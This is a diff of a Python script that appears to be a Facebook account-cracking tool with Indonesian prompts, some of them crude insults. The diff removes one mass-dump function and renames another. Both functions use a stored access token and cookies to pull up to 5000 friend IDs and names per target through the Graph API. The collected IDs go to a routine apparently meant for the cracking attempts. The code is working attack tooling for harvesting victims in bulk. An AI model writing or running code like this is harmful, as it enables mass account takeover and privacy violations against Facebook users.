@@ -396,55 +396,8 @@ def menu():
 	        hasil_ok()
 	elif CYXIEON_GANTENG in ['00','0']:
             ganti_cokies()
-#-------------------[ CRACK-PUBLIK ]----------------#
-def dump_massal():
-	try:
-		token = open('.tok.txt','r').read()
-		cok = open('.cok.txt','r').read()
-	except IOError:
-		exit()
-	try:
-		print(f"\n{biru}╭────────────────────────────────────────────{puti}")
-		jum = int(input('└──[ Mau Berapa Target Njing ? : '))
-	except ValueError:
-		print('>> Masukkan Angka Anjing, Malah Huruff ')
-		exit()
-	if jum<1 or jum>100:
-		print('>> Gagal Dump Idz ')
-		exit()
-	ses=requests.Session()
-	yz = 0
-	for met in range(jum):
-		yz+=1
-		kl = input('└──[ Masukkan Idz Yang Ke '+str(yz)+' : ')
-		uid.append(kl)
-	for userr in uid:
-		try:
-			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+token[0], cookies = {'cookies':cok}).json()
-			for mi in col['friends']['data']:
-				try:
-					iso = (mi['id']+'|'+mi['name'])
-					if iso in id:pass
-					else:id.append(iso)
-				except:continue
-		except (KeyError,IOError):
-			pass
-		except requests.exceptions.ConnectionError:
-			print('>> Sinyal Loh Kek Kontoll ')
-			exit()
-	try:
-		print(f'└──[ Total Idz Yang Terkumpul🔥{h}'+str(len(id)))
-		atur_id()
-	except requests.exceptions.ConnectionError:
-		print(f'{x}')
-		print('>> Sinyal Lo kek Kontol ')
-		exit()
-	except (KeyError,IOError):
-		print(f'>>{k} Pertemanan Tidak Public {x}')
-		time.sleep(3)
-		exit()
 #----------[ CRACK-MASSAL ]----------#      
-def dumpp_massal():
+def dump_massal():
 	try:
 		token = open('.token.txt','r').read()
 		cok = open('.cok.txt','r').read()
@@ -492,7 +445,7 @@ def dumpp_massal():
 	    except (KeyError,IOError):
 	      pass
 	    except requests.exceptions.ConnectionError:
-	        exit()
+	      exit()
 	try:
 	      prints(f"{biru}└──[{puti} lagi mengumpulkan id, telah sukses mengumpulkan [green]{len(id)}[white] id")
 	      atur_id()
